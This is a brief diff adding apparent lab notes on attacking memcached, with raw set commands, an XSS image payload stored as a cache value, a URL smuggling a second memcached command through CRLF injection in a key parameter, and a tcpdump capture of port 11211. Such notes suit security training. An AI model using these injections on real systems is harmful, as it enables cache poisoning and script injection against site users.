@@ -1,0 +1,12 @@
+asd 0 3600 5
+asdfg
+set omer 0 3600 37
+<img src=x onerror=alert("lyk_2016")>
+
+
+
+get içinde set
+memcached.php?key=1%0set+key2+0+30+4%0D%0Aomer%0D%0A
+
+
+tcpdump -i lo -X port 11211 -w /var/www/capture.pcap
